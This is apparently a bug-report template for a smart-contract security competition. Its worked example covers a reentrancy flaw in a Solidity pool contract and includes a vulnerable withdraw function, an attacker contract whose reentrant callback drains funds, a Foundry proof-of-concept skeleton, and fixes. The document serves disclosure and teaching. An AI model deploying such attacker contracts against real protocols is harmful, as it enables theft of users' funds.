# 🐛 Bug Report Template - ZSA Attackathon 2025

---

## Report Information

**Report ID**: [BUG-001]  
**Submission Date**: [Date]  
**Researcher**: [Your Name/Handle]  
**Severity**: CRITICAL  

---

## Executive Summary

[2-3 sentence summary of the vulnerability and its impact]

**Example**: 
> A reentrancy vulnerability exists in the Pool contract's `withdraw()` function that allows an attacker to drain all funds from the protocol. By exploiting the callback mechanism before state updates, an attacker can repeatedly withdraw funds while maintaining their balance, resulting in complete protocol drainage.

---

## 1. Vulnerability Details

### 1.1 Affected Contract
- **Contract Name**: [e.g., Pool]
- **Contract Address**: [e.g., 0x5ae329203e00f76891094dcfedd5aca082a50e1b]
- **Network**: Ethereum Mainnet
- **Solidity Version**: 0.8.10

### 1.2 Vulnerable Function(s)
```solidity
function vulnerableFunction(
    address asset,
    uint256 amount,
    address to
) external {
    // Vulnerable code here
    // Highlight the specific lines
}
```

**Location**: [File path:Line numbers]  
**Example**: `Pool.sol:512-545`

### 1.3 Vulnerability Type
- [ ] Reentrancy
- [ ] Access Control
- [ ] Oracle Manipulation
- [ ] Integer Overflow/Underflow
- [ ] Logic Error
- [ ] Initialization Issue
- [ ] Upgrade/Proxy Issue
- [ ] Flash Loan Exploit
- [ ] Other: _____________

---

## 2. Root Cause Analysis

### 2.1 Technical Explanation

[Detailed explanation of WHY the vulnerability exists]

**Example**:
> The vulnerability exists because the `withdraw()` function performs an external call to transfer tokens before updating the user's balance in storage. This violates the Checks-Effects-Interactions pattern.
>
> Specifically:
> 1. Line 520: Checks user has sufficient balance
> 2. Line 535: **External call** to `IERC20(asset).transfer(to, amount)`
> 3. Line 540: **State update** `userBalance[msg.sender] -= amount`
>
> An attacker can implement a malicious `receive()` function that calls `withdraw()` again during step 2, before step 3 updates the balance.

### 2.2 Code Walkthrough

```solidity
// VULNERABLE CODE
function withdraw(address asset, uint256 amount, address to) external {
    uint256 userBalance = balances[msg.sender][asset];
    require(userBalance >= amount, "Insufficient balance");  // ✅ Check
    
    IERC20(asset).transfer(to, amount);  // ❌ External call BEFORE state update
    
    balances[msg.sender][asset] -= amount;  // ❌ State update AFTER external call
    
    emit Withdrawn(msg.sender, asset, amount);
}
```

**The Problem**:
- External call at line X happens before state update at line Y
- This allows reentrancy

---

## 3. Impact Assessment

### 3.1 Severity Justification

**Severity**: CRITICAL

**Justification**: This vulnerability meets the competition criteria for critical severity:
- ✅ Allows direct theft of funds
- ✅ Results in complete fund drain
- ✅ No special permissions required
- ✅ Easily exploitable with simple contract

### 3.2 Financial Impact

**Potential Loss**: [Calculate exact amount]

**Example**:
- Current Protocol TVL: $150,000,000
- Exploitable Amount: 100% of TVL
- **Total Potential Loss: $150,000,000**

### 3.3 Attack Feasibility

- **Complexity**: Low / Medium / High
- **Prerequisites**: [List what attacker needs]
- **Cost to Execute**: [Gas costs, capital needed, etc.]
- **Detection Difficulty**: [Can it be detected/prevented?]

**Example**:
- **Complexity**: Low (simple malicious contract)
- **Prerequisites**: None (public function)
- **Cost**: ~$100 in gas fees
- **Detection**: Difficult to prevent once initiated

---

## 4. Attack Scenario

### 4.1 Step-by-Step Attack

**Step 1: Preparation**
```solidity
// Deploy malicious contract
contract Attacker {
    IPool public pool;
    IERC20 public token;
    uint256 public attackCount;
    
    constructor(address _pool, address _token) {
        pool = IPool(_pool);
        token = IERC20(_token);
    }
}
```

**Step 2: Initial Deposit**
```solidity
// Deposit funds to get initial balance
function step1_deposit() external payable {
    pool.deposit(address(token), 1 ether, address(this), 0);
}
```

**Step 3: Execute Attack**
```solidity
function step2_attack() external {
    // Start the reentrancy attack
    pool.withdraw(address(token), 1 ether, address(this));
}
```

**Step 4: Reentrant Callback**
```solidity
receive() external payable {
    if (attackCount < 10) {  // Drain 10x the initial deposit
        attackCount++;
        pool.withdraw(address(token), 1 ether, address(this));
    }
}
```

**Step 5: Profit**
```solidity
function step3_withdrawProfit() external {
    // Transfer stolen funds
    token.transfer(msg.sender, token.balanceOf(address(this)));
}
```

### 4.2 Attack Flow Diagram

```
1. Attacker deposits 1 ETH
2. Attacker calls withdraw(1 ETH)
   ↓
3. Pool transfers 1 ETH to Attacker
   ↓
4. Attacker's receive() triggered
   ↓
5. Attacker calls withdraw(1 ETH) AGAIN
   ↓ (Balance not yet updated)
6. Pool transfers 1 ETH AGAIN
   ↓
7. Loop continues until pool drained
   ↓
8. Final state update (too late)
```

---

## 5. Proof of Concept

### 5.1 Test Setup

**Test File**: `test/Pool_Reentrancy_POC.t.sol`

**Environment**:
- Foundry mainnet fork
- Block number: [specific block]
- Required tokens: [list tokens]

### 5.2 Complete PoC Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract PoolReentrancyPoC is Test {
    // [Include complete, working PoC code]
    // This should be copy-pasteable and runnable
    
    function testReentrancyExploit() public {
        // Initial balances
        console.log("=== INITIAL STATE ===");
        uint256 poolBalanceBefore = token.balanceOf(address(pool));
        uint256 attackerBalanceBefore = token.balanceOf(attacker);
        console.log("Pool balance:", poolBalanceBefore);
        console.log("Attacker balance:", attackerBalanceBefore);
        
        // Execute attack
        console.log("\n=== EXECUTING ATTACK ===");
        attacker.attack();
        
        // Final balances
        console.log("\n=== FINAL STATE ===");
        uint256 poolBalanceAfter = token.balanceOf(address(pool));
        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        console.log("Pool balance:", poolBalanceAfter);
        console.log("Attacker balance:", attackerBalanceAfter);
        
        // Profit calculation
        uint256 stolen = poolBalanceBefore - poolBalanceAfter;
        console.log("\n=== RESULT ===");
        console.log("Amount stolen:", stolen);
        console.log("Profit:", attackerBalanceAfter - attackerBalanceBefore);
        
        // Assertions
        assertGt(stolen, 0, "No funds stolen");
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker did not profit");
    }
}
```

### 5.3 How to Run PoC

```bash
# 1. Set up mainnet fork
export MAINNET_RPC_URL="https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY"

# 2. Run the test
forge test --match-contract PoolReentrancyPoC --match-test testReentrancyExploit -vvvv --fork-url $MAINNET_RPC_URL

# 3. Expected output:
# [PASS] testReentrancyExploit()
# Logs:
#   === INITIAL STATE ===
#   Pool balance: 1000000000000000000000
#   Attacker balance: 0
#   
#   === EXECUTING ATTACK ===
#   ... attack logs ...
#   
#   === FINAL STATE ===
#   Pool balance: 0
#   Attacker balance: 1000000000000000000000
#   
#   === RESULT ===
#   Amount stolen: 1000000000000000000000
#   Profit: 1000000000000000000000
```

### 5.4 Test Results

[Include actual output from running the PoC]

```
[Paste console output here showing successful exploit]
```

---

## 6. Recommended Fix

### 6.1 Short-term Fix

```solidity
// Add ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Pool is ReentrancyGuard {
    function withdraw(address asset, uint256 amount, address to) 
        external 
        nonReentrant  // ✅ Add this modifier
    {
        uint256 userBalance = balances[msg.sender][asset];
        require(userBalance >= amount, "Insufficient balance");
        
        IERC20(asset).transfer(to, amount);
        balances[msg.sender][asset] -= amount;
        
        emit Withdrawn(msg.sender, asset, amount);
    }
}
```

### 6.2 Long-term Fix (Recommended)

```solidity
// Follow Checks-Effects-Interactions pattern
function withdraw(address asset, uint256 amount, address to) external {
    uint256 userBalance = balances[msg.sender][asset];
    require(userBalance >= amount, "Insufficient balance");  // Checks
    
    balances[msg.sender][asset] -= amount;  // ✅ Effects FIRST
    
    IERC20(asset).transfer(to, amount);  // ✅ Interactions LAST
    
    emit Withdrawn(msg.sender, asset, amount);
}
```

### 6.3 Fix Verification

After applying the fix, run:
```bash
forge test --match-contract PoolReentrancyPoC --match-test testReentrancyExploit

# Expected: Test should FAIL (exploit no longer works)
# [FAIL] testReentrancyExploit()
# Reason: Reentrancy blocked
```

---

## 7. References

### 7.1 Similar Vulnerabilities
- [DAO Hack 2016 - Reentrancy](https://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/)
- [Cream Finance Hack - Flash Loan + Reentrancy](https://rekt.news/cream-rekt/)

### 7.2 Security Resources
- [Consensys Best Practices - Reentrancy](https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/)
- [OpenZeppelin ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)

---

## 8. Appendix

### 8.1 Test Environment Details
- Foundry version: 1.4.2-stable
- Fork block: [specific block number]
- Test duration: [time]
- Gas used: [amount]

### 8.2 Additional Notes
[Any other relevant information]

---

## 📸 Screenshots

**Required**: Minimum 15 screenshots showing:
1. Initial setup
2. Contract deployment
3. Each step of exploit execution
4. Balance changes
5. Transaction logs
6. Final state
7. Code snippets
8. Test output
9. Gas usage
10. Error messages (if any)
11. Before/after comparisons
12. [Additional relevant screenshots]

[Include screenshots in the screenshots/ folder and reference them here]

---

## ✅ Submission Checklist

- [ ] Severity confirmed as CRITICAL
- [ ] Complete PoC included and tested
- [ ] PoC is reproducible
- [ ] All steps documented
- [ ] Impact quantified
- [ ] Fix provided and tested
- [ ] 15+ screenshots included
- [ ] Code properly formatted
- [ ] All sections completed
- [ ] Professional language used
- [ ] Contact information included

---

**Researcher Contact**: [Your email/handle]  
**Date**: [Submission date]  
**Competition**: ZSA Attackathon 2025

---

*This bug report follows responsible disclosure practices. The vulnerability has not been exploited on mainnet and is reported solely for competition purposes.*

